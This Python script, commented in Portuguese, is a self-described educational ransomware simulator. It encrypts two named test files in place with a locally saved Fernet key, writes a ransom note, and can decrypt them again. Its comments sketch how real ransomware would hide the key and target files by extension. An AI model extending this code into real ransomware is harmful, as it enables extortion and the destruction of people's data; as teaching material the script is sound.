import os
from cryptography.fernet import Fernet

# --- 1. Geração e Gerenciamento da Chave ---

def gerar_e_salvar_chave():
    """
    Gera uma chave de criptografia e a salva em um arquivo 'chave.key'.
    """
    # Gera a chave
    chave = Fernet.generate_key()
    
    # Salva a chave em um arquivo. Em um ransomware real, o atacante
    # manteria essa chave em segredo (ou usaria criptografia assimétrica).
    with open("chave.key", "wb") as file:
        file.write(chave)
    print("Nova chave gerada e salva como 'chave.key'")
    return chave

def carregar_chave():
    """
    Carrega a chave do arquivo 'chave.key'.
    """
    try:
        with open("chave.key", "rb") as file:
            return file.read()
    except FileNotFoundError:
        print("Erro: Arquivo 'chave.key' não encontrado. Gere uma chave primeiro.")
        return None

# --- 2. Funções de Criptografia e Descriptografia ---

def criptografar_arquivos(arquivos_alvo, fernet_obj):
    """
    Criptografa uma lista de arquivos.
    """
    print(f"Criptografando {len(arquivos_alvo)} arquivos...")
    for arquivo in arquivos_alvo:
        try:
            with open(arquivo, "rb") as file:
                dados_originais = file.read()
            
            dados_criptografados = fernet_obj.encrypt(dados_originais)
            
            with open(arquivo, "wb") as file:
                file.write(dados_criptografados)
            
            print(f"[SUCESSO] Arquivo criptografado: {arquivo}")
        
        except Exception as e:
            print(f"[FALHA] Erro ao criptografar {arquivo}: {e}")

def descriptografar_arquivos(arquivos_alvo, fernet_obj):
    """
    Descriptografa uma lista de arquivos.
    """
    print(f"\nDescriptografando {len(arquivos_alvo)} arquivos...")
    for arquivo in arquivos_alvo:
        try:
            with open(arquivo, "rb") as file:
                dados_criptografados = file.read()
            
            dados_descriptografados = fernet_obj.decrypt(dados_criptografados)
            
            with open(arquivo, "wb") as file:
                file.write(dados_descriptografados)
                
            print(f"[SUCESSO] Arquivo descriptografado: {arquivo}")

        except Exception as e:
            # Isso pode falhar se a chave estiver errada (InvalidToken)
            print(f"[FALHA] Erro ao descriptografar {arquivo}: {e}")

# --- 3. Função Principal da Simulação ---

def main():
    # --- Configuração ---
    # Em um cenário real, o malware buscaria por extensões (.doc, .jpg, .xls)
    # Aqui, definimos explicitamente nossos alvos para segurança.
    arquivos_alvo = ["teste_01.txt", "teste_02.txt"]

    print("--- SIMULADOR DE RANSOMWARE EDUCACIONAL ---")
    print("AVISO: Execute apenas em arquivos de teste criados para isso.")
    print("--------------------------------------------------")
    
    escolha = input(
        "O que deseja fazer?\n"
        "1. Gerar nova chave (Faça isso primeiro!)\n"
        "2. Criptografar arquivos de teste\n"
        "3. Descriptografar arquivos de teste\n"
        "Digite sua escolha (1, 2 ou 3): "
    )

    if escolha == "1":
        gerar_e_salvar_chave()
        
    elif escolha == "2":
        chave = carregar_chave()
        if not chave:
            return
            
        fernet = Fernet(chave)
        criptografar_arquivos(arquivos_alvo, fernet)
        
        # Cria a "mensagem de resgate"
        with open("LEIA_PARA_RECUPERAR_SEUS_ARQUIVOS.txt", "w", encoding="utf-8") as nota:
            nota.write("Seus arquivos foram criptografados!\n")
            nota.write("Para recuperá-los, envie 100 Bitcoins para o endereço X...\n")
            nota.write("(Esta é apenas uma simulação educacional.)")
        print("\nNota de 'resgate' criada.")

    elif escolha == "3":
        chave = carregar_chave()
        if not chave:
            return
            
        fernet = Fernet(chave)
        descriptografar_arquivos(arquivos_alvo, fernet)
        
    else:
        print("Escolha inválida.")

if __name__ == "__main__":
    main()
